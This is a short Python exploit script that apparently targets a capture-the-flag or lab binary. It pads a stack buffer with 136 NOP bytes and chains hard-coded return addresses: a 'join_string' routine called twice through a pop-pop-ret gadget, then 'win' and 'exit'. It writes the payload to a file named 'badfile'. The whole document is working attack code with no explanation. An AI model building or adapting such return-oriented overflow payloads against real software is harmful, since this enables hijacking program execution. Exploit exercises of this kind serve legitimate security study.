import struct 

win = 0x804848f
join_string = 0x804846b
pop_pop_ret= 0x0804856a

str1 = 0x804a024
str2 = 0x804a044
str3 = 0x804a050

exit = 0xb7e337f0

nop = '\x90'
atk_vector = nop*136
atk_vector += struct.pack('I', join_string)
atk_vector += struct.pack('I', pop_pop_ret)
atk_vector += struct.pack('I', str3)
atk_vector += struct.pack('I', str1)
atk_vector += struct.pack('I', join_string)
atk_vector += struct.pack('I', pop_pop_ret)
atk_vector += struct.pack('I', str3)
atk_vector += struct.pack('I', str2)
atk_vector += struct.pack('I', win)
atk_vector += struct.pack('I', exit)


f = open('badfile', 'w+')
f.write(atk_vector)
f.close()






